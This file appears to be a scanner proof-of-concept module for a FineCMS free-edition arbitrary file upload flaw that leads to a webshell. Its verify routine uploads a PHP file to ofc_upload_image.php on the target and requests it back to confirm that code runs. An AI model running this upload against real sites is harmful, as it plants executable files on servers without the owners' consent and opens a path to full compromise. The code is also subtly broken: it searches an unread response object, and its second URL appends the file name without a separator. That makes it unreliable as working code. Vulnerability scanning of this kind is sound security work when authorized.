# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2
import random

class Vuln(ABVuln):
    vuln_id = 'FineCMS_0001' # 平台漏洞编号，留空
    name = 'FineCMS免费版无条件getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-04-07'  # 漏洞公布时间
    desc = '''
        FineCMS /dayrui/libraries/Chart/ofc_upload_image.php 未做限制，可上传任意文件，getshell.
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'FineCMS'  # 漏洞应用名称
    product_version = '免费版'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '95e52122-7a2a-4ece-9d77-3ccf93761449'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            fileName = "shell" + str(random.randrange(1000,9999)) + ".php"
            target = self.target + '/dayrui/libraries/Chart/ofc_upload_image.php'
            url = target + "?name=" + fileName
            req = urllib2.Request(url, headers={"Content-Type": "application/oct"}) 
            res = urllib2.urlopen(req, data="<?print(md5(0x22))?>")

            if res.find("tmp-upload-images") == -1:
                #print "Failed !"
                return

            url = self.target + '/dayrui/libraries/Chart/ofc_upload_image.php' + fileName
            md5 = urllib2.urlopen(url).read()
            if md5.find("e369853df766fa44e1ed0ff613f563bd") != -1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
